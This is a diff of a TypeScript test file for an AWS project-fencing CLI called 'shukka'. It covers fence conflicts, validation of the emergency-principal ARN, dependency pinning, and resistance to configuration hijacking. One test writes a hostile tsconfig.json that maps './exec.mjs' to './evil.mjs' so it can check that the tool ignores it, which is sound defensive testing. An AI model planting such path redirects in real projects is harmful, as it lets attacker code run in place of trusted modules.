+  const policies = [
+    { name: 'other-shukka-boundary', arn: `arn:aws:iam::${ACCOUNT}:policy/other-shukka-boundary`, defaultVersionId: 'v1' },
+    { name: 'other-shukka-execution', arn: `arn:aws:iam::${ACCOUNT}:policy/other-shukka-execution`, defaultVersionId: 'v3' },
+  ];
+  const docs = (zone: string, domain: string) => async (p: any) => (p.name === 'other-shukka-execution'
+    ? JSON.stringify({ Statement: [{ Resource: `arn:aws:route53:::hostedzone/${zone}` }, { Resource: [`arn:aws:ses:us-east-1:${ACCOUNT}:identity/${domain}`] }] })
+    : '{}');
+  const run = async (over: Fake) => {
+    const { calls, spawn } = recordingSpawn();
+    const r = await cli(projectArgs().filter((a) => a !== '--dry-run'), { cwd: dir, spawn, aws: fakeAws(over).aws });
+    assert.deepEqual(MUTATING(calls), [], 'nothing ran');
+    return r;
+  };
+  let r = await run({ localPolicies: async () => policies, policyDocument: docs(ZONE, 'other.example') });
+  assert.equal(r.code, 1);
+  assert.match(r.err, new RegExp(`hosted zone ${ZONE} \\(example\\.com\\.\\) is already in project other's fence`));
+  r = await run({ localPolicies: async () => policies, policyDocument: docs('ZOTHER', 'Example.com') });
+  assert.equal(r.code, 1);
+  assert.match(r.err, /mail domain example\.com is already in project other's fence/);
+  r = await run({ localPolicies: async () => [{ name: 'shukkatestx-shukka-boundary', arn: 'a', defaultVersionId: 'v1' }] });
+  assert.equal(r.code, 1);
+  assert.match(r.err, /"shukkatest" is a prefix of known project "shukkatestx"/);
+  r = await run({ localPolicies: async () => { throw new Error('AccessDenied'); } });
+  assert.equal(r.code, 1);
+  assert.match(r.err, /cannot list the account's IAM policies .*AccessDenied/);
+}));
+
+test('shu-5ix: a bad --emergency-principal is refused before any lookup', withTmp(async (tmp) => {
+  const { dir } = consumer(tmp);
+  const fake = fakeAws();
+  const r = await cli(projectArgs(['--emergency-principal', 'arn:aws:iam::123456789012:role/*']).filter((a) => a !== '--dry-run'), { cwd: dir, aws: fake.aws });
+  assert.equal(r.code, 1);
+  assert.match(r.err, /emergency principal "arn:aws:iam::123456789012:role\/\*" must be an IAM role or user ARN/);
+  assert.deepEqual(fake.reads, [], 'no AWS read was made');
+}));
+
+test('shu-5ix: the CLI ships an npm-shrinkwrap.json pinning its runtime tree, and aws-cdk-lib is pinned to the tested version', () => {
+  const pkg = JSON.parse(readFileSync(join(root, 'package.json'), 'utf8'));
+  const wrap = JSON.parse(readFileSync(join(root, 'npm-shrinkwrap.json'), 'utf8'));
+  assert.ok(!existsSync(join(root, 'package-lock.json')), 'one lockfile: npm-shrinkwrap.json');
+  assert.equal(pkg.dependencies['aws-cdk'], '2.1148.0');
+  assert.match(pkg.devDependencies['aws-cdk-lib'], /^\d+\.\d+\.\d+$/);
+  for (const [name, range] of Object.entries(pkg.dependencies as Record<string, string>)) {
+    const locked = wrap.packages[`node_modules/${name}`];
+    assert.ok(locked && !locked.dev, `${name} is in the shrinkwrap as a runtime dependency`);
+    if (/^\d+\.\d+\.\d+$/.test(range)) assert.equal(locked.version, range);
+  }
+  assert.equal(wrap.packages['node_modules/aws-cdk-lib'].version, pkg.devDependencies['aws-cdk-lib']);
+});
+
+test("shu-5ix: bin/shukka compiles with shukka's own tsconfig, not one in the directory it runs from", withTmp((tmp) => {
+  write(join(tmp, 'tsconfig.json'), '{ "compilerOptions": { "jsx": "react", "paths": { "./exec.mjs": ["./evil.mjs"] } }, broken');
+  const r = spawnSync(process.execPath, [join(root, 'bin', 'shukka'), '--help'], { cwd: tmp, encoding: 'utf8', env: { ...process.env, TSX_TSCONFIG_PATH: join(tmp, 'tsconfig.json') } });
+  assert.equal(r.status, 0, r.stderr);
+  assert.equal(r.stdout, helpText());
+  assert.match(readFileSync(join(root, 'bin', 'shukka'), 'utf8'), /process\.env\.TSX_TSCONFIG_PATH = tsconfig;\nregister\(\{ tsconfig \}\);/);
 }));
 
 // ---------- --help ----------
